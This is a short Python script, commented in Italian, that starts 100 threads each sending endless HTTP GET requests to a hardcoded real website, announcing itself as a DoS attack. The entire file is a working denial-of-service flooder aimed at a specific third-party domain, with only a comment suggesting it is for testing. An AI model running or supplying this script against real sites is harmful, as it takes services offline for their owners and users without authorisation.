import threading
import requests

def send_request(url):
    try:
        while True:
            response = requests.get(url)
            print(f"Request sent to {url}, status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def start_dos_attack(url, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=send_request, args=(url,))
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    target_url = "https://matermeamilano.it/"  # Sostituisci con l'URL del sistema da testare
    num_threads = 100  # Numero di thread concorrenti

    print(f"Starting DoS attack on {target_url} with {num_threads} threads...")
    start_dos_attack(target_url, num_threads)

    # Mantieni il programma in esecuzione
    while True:
        pass